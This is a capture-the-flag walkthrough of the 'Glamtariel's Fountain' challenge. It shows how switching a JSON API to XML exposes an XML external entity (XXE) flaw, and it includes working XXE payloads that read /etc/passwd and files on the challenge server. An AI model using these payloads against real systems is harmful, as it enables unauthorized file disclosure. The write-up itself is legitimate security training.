# Glamtariel's Fountain Challenge

Glamtariel's Fountain was a strange contrived capture-the-flag-esque challenge that involved dropping various Christmas-themed items into a crudely-drawn fountain or a crudely-drawn elf. Based on what you dragged-and-dropped, the Elf (Glamtariel) and the Fountain would both have something to say about the item. At various times, their speech would have CAPITAL LETTERS to serve as a hint for what to do next in this challenge. It was odd, but it is what it is.

The communication between client and server was _by default_ JSON-encoded payloads. While

Explain that I had to drag things into either Glamtariel herself or her fountain. The CAPITAL LETTERS were clues as to what to focus on for each part of the challenge. You reach part two of the challenge when all you have to offer Glamtariel and her fountain are a set of 4 rings.

The opening image:

![The Fountain](/img/fountain/fountain1.png)

Click on Santa...

![The Fountain](/img/fountain/fountain2.png)

Click the candy cane...

![The Fountain](/img/fountain/fountain3.png)

Drag santa to the cake...

![The Fountain](/img/fountain/fountain4.png)

Drag the ice to the cake:

![The Fountain](/img/fountain/fountain5.png)

etc, etc...

It doesn't really matter much of what it is that they say, with the exception of some of the capitlized words. Among them:

```
TAMPER
TRAFFIC FLIES
PATH
```

Eventually, after dragging enough items over, they change to another set!

![The Fountain](/img/fountain/fountain11.png)

Drag the green ring to the fountain:
![The Fountain](/img/fountain/fountain12.png)

And the eye of...Sauron? Whatever the case, there is new dialogue and more capital letters.

```
APP
TYPE
```

Eventually we are greeted with a new set of items! 4 rings! Passing these rings around gives us a couple more clues:

```
SIMPLE FORMAT
RINGLIST
```

![The Fountain](/img/fountain/fountain20.png)

## Pulling out the Big Guns

It is at this point where the clicky-draggy part of this game is over, and we must now begin with the TAMPERing, as instructed. I have just the tool...Burp Suite!

I configured my browser to send traffic through Burp Suite, and intercepted a request. From there, I took onee such POST request I made and sent it to the Repeater tool, which allows me to make arbitrary trivial (or not so trivial) changes to a request before sending it ad hoc and view the server response. One of the single most useful tools packaged with Burp Suite that I know of.

Below you can see the standard back-and-forth that your browser makes as you drag and drop items from one place to another.

Among the many request headers that I send, the payload I am sending is JSON.
![The Fountain](/img/fountain/fountain15.png)

For readability:

```json
{
  "imgDrop":"img6",
  "who":"fountain",
  "reqType":"json"
}
```
So if I drop whatever `img6` is on the fountain, this is the request my client makes. In response, we get a JSON blob that the client-side app knows how to present to the user. In the above screenshot, I tried my hand at TAMPERing with the `MiniLembanh` and `GCLB` cookies, only to eventually realize that all this does is upset Grinchum and I have to start over. So basically don't touch them. Whoops.

It took a fair bit of time trying to figure out what else I could make this application do, until I realized...why does it matter that I specify `reqType` as `json` all the time? What about other data formats? Why not XML? Why not Zoidberg?

## XML Attacks

By modifying the request just a _slight amount_, I can get the same response, and keying off of the `SIMPLE FORMAT` clue, I use an extremely basic XML request:

!!! abstract "Request"
    ```
    Content-Type: application/xml
    <?xml version="1"?>
    <root>
      <imgDrop>img2</imgDrop>
      <reqType>xml</reqType>
      <who>princess</who>
    </root>
    ```

!!! abstract "Response"
    ```json
    {
    "appResp": "I love rings of all colors!^She definitely tries to convince everyone that the blue ones 
    are her favorites. I'm not so sure though.",
    "droppedOn": "none",
    "visit": "none"
    }
    ```

While that response seemed odd, it was _different_ from most requests in that if they didn't understand me, I would be told that in so many words. So I've proven that not only will they respond to JSON, but they will ALSO respond to XML!

And it just so happens there is an attack vector to explore with XML parsing. Specifically [XML eXternal Entity injections](https://portswigger.net/web-security/xxe), or XXE for short.

Essentially there is a directive in XML processing that can allow for the possibility of code injection or file inclusion. If I were to add something like this:

```xml
<?xml version="1.0" ?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <foo>&xxe;</foo>
```

...and it would access the `/etc/passwd` file on the server and [hopefully] return the file contents in the response.

Unfortunately, as ubiquitous as dumping the contents of `/etc/passwd` is in _confirming_ the vulnerability, this challenge was not so forgiving of that technique and instead has you piece together all of the clues to determine _what file to return_.

Well, specifically the ones in question are `TRAFFIC FLIES` and `PATH`. From this, I gathered that maybe simply reviewing where images/css/js files are being pulled from would give me an idea for the location of the static files on this server. And finally, the mention of a `RINGLIST` file

...and Ultimately, after piecing together all the clues as mentioned before, I finally got a different response.

!!! abstract "Request"
    ```xml
    <?xml version="1.0" ?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/static/images/ringlist.txt" >]>
    <root>
        <imgDrop>&xxe;</imgDrop>
        <reqType>xml</reqType>
        <who>princess</who>
    </root>
    ```

!!! abstract "Response"
    ```json
    {
        "appResp": "Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any 
        secrets in it any more! Please though, don't tell anyone about this.^She really does try to keep 
        things safe. Best just to put it away. (click)",
        "droppedOn": "none",
        "visit": "static/images/pholder-morethantopsupersecret63842.png,262px,100px"
    }
    ```

Gave me a link to an image. I snapped that here:

![The Fountain](/img/fountain/fountain16.png)

So...a reference to a folder with some filenames, specifically `/x_phial_pholder_2022/` and `bluering.txt` and what appears to be `redring.txt`.

Changing the XXE to look for that blue ring first...

!!! abstract "Request"
    ```xml
    <?xml version="1.0" ?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/bluering.txt" >]>
    <root>
        <imgDrop>&xxe;</imgDrop>
        <reqType>xml</reqType>
        <who>princess</who>
    </root>
    ```

!!! abstract "Response"
    ```json
    {
      "appResp": "I love these fancy blue rings! You can see we have two of them. Not magical or anything, 
      just really pretty.^She definitely tries to convince everyone that the blue ones are her favorites. 
      I'm not so sure though.",
      "droppedOn": "none",
      "visit": "none"
    }
    ```

And what about the red ring?

!!! abstract "Request"
    ```xml
    <?xml version="1.0" ?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/redring.txt" >]>
    <root>
        <imgDrop>&xxe;</imgDrop>
        <reqType>xml</reqType>
        <who>princess</who>
    </root>
    ```

!!! abstract "Response"
    ```json
    {
        "appResp": "Hmmm, you still seem awfully interested in these rings. I can't blame you, they are 
        pretty nice.^Oooooh, I can just tell she'd like to talk about them some more.",
        "droppedOn": "none",
        "visit": "none"
    }
    ```

Hmm...not a whole lot of info to go on there. But one of the Dialogs that Glamtariel mentions a silver ring that she loves so much. Does that exist?

!!! abstract "Request"
    ```xml
    <?xml version="1.0" ?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/silverring.txt" >]>
    <root>
        <imgDrop>&xxe;</imgDrop>
        <reqType>xml</reqType>
        <who>princess</who>
    </root>
    ```

!!! abstract "Response"
    ```json
    {
        "appResp": "I'd so love to add that silver ring to my collection, but what's this? Someone has 
        defiled my red ring! Click it out of the way please!.^Can't say that looks good. Someone has been up 
        to no good. Probably that miserable Grinchum!",
        "droppedOn": "none",
        "visit": "static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px"
    }
    ```

The plot thickens. This is the image file it mentions:

![The Fountain](/img/fountain/fountain17.png)


Interesting. Let's do more of the same for this new file `goldring_to_be_deleted.txt`.

!!! abstract "Request"
    ```xml
    <?xml version="1.0" ?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/
    goldring_to_be_deleted.txt" >]>
    <root>
        <imgDrop>&xxe;</imgDrop>
        <reqType>xml</reqType>
        <who>princess</who>
    </root>
    ```

!!! abstract "Response"
    ```json
    {
        "appResp": "Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but 
        instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such 
        things, I'd only use a secret TYPE of tongue to discuss them.^She's definitely hiding something.",
        "droppedOn": "none",
        "visit": "none"
    }
    ```

Before I get into what `REQ` and `TYPE` are in reference to, I want to mention that I found what I can only assume is an Easter Egg. In searching for `greenring.txt`:

!!! abstract "Request"
    ```xml
    <?xml version="1.0" ?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/greenring.txt" >]>
    <root>
        <imgDrop>&xxe;</imgDrop>
        <reqType>xml</reqType>
        <who>princess</who>
    </root>
    ```

!!! abstract "Response"
    ```json
    {
        "appResp": "Hey, who is this guy? He doesn't have a ticket!^I don't remember seeing him in the movies!",
        "droppedOn": "none",
        "visit": "static/images/x_phial_pholder_2022/tomb2022-tommyeasteregg3847516894.png,230px,30px"
    }
    ```

???

Why, it's Tom Bombadil of Tolkien fame!

![The Fountain](/img/fountain/fountain18.png)

Interesting fact about Tom Bombadil, according to some of the more prominent fans of Tolkien culture, Tom Bombadil is considered one of the most powerful entities in Middle Earth, even more powerful than Sauron. This is evidenced by how he acts when presented with the One Ring in such a cavalier manner. He holds it, investigates it, and gives it back basically saying "cool ring." Despite everything, the single most powerful ring holds no power over Tom Bombadil as he simply doesn't care much for it. Because he is so aloof and unwilling to meddle in the affairs of Middle Earth inhabitants, his involvement is virtually non-existant. For that reason (and because his character was a bit of a distraction from the plot), he was cut from appearing in the Peter Jackson movies.

## A Bold REQuest

Admittedly, this one kept me guessing for quite a bit. I attempted to modify the request method, the content type header, other various things. But really, the _one_ thing that needed to be modified was...just the location of the XXE payload. Instead of putting it in the `#!xml <imgDrop>` payload, I had to put it in the `#!xml <reqType>` payload.

!!! abstract "Request"
    ```xml
    <?xml version="1.0" ?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt" >]>
    <root>
        <imgDrop>img1</imgDrop>
        <reqType>&xxe;</reqType>
        <who>princess</who>
    </root>
    ```

!!! abstract "Response"
    ```json
    {
        "appResp": "No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if 
        you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one 
        nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, 
        I've been keeping it safe until someone trustworthy such as yourself came along. 
        Congratulations!^Wow, I have never seen that before! She must really trust you!",
      "droppedOn": "none",
      "visit": "static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px"
    }
    ```

![The Fountain](/img/fountain/fountain19.png)

!!! success
    The answer to Glamtariel's fountain: `goldring-morethansupertopsecret76394734.png`